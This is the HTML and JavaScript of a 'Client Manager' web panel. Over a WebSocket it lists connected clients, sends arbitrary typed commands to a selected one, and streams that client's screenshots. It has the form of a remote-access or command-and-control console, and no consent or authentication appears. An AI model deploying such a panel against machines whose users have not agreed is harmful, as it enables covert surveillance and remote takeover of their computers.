<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Client Manager</title>
</head>
<body>
  <h1>Client Manager</h1>
  <div id="clients"></div>
  <div id="selectedClient"></div>
  <input type="text" id="cmdInput" placeholder="Command">
  <button onclick="sendCommand()">Send</button>
  <button onclick="startScreen()">Start Screen</button>
  <button onclick="stopScreen()">Stop Screen</button>
  <img id="screen" style="max-width: 100%; display:none;">

  <script>
    let selectedClient = null;
    const ws = new WebSocket(`wss://${window.location.host}/ws/admin`);
    ws.onmessage = (e) => {
      if (e.data.startsWith('[')) {
        const idx = e.data.indexOf(']');
        const id = e.data.slice(1, idx);
        const msg = e.data.slice(idx+1);
        if (id === selectedClient) {
          document.getElementById('selectedClient').innerText = msg;
        }
      } else if (e.data instanceof Blob) {
        const url = URL.createObjectURL(e.data);
        const img = document.getElementById('screen');
        img.src = url;
        img.style.display = 'block';
      } else {
        const data = JSON.parse(e.data);
        if (data.type === 'init') {
          showClients(Object.keys(data.clients));
        } else if (data.type === 'client_update') {
          // no-op for simplicity
        }
      }
    };

    function showClients(clients) {
      const d = document.getElementById('clients');
      d.innerHTML = '';
      clients.forEach(id => {
        const b = document.createElement('button');
        b.innerText = id;
        b.onclick = () => selectedClient = id;
        d.appendChild(b);
      });
    }

    function sendCommand() {
      if (selectedClient) {
        const cmd = document.getElementById('cmdInput').value;
        ws.send(JSON.stringify({ target: selectedClient, cmd }));
      }
    }

    function startScreen() {
      if (selectedClient) ws.send(JSON.stringify({ target: selectedClient, cmd: 'screenshot_start' }));
    }

    function stopScreen() {
      if (selectedClient) ws.send(JSON.stringify({ target: selectedClient, cmd: 'screenshot_stop' }));
      document.getElementById('screen').style.display = 'none';
    }
  </script>
</body>
</html>
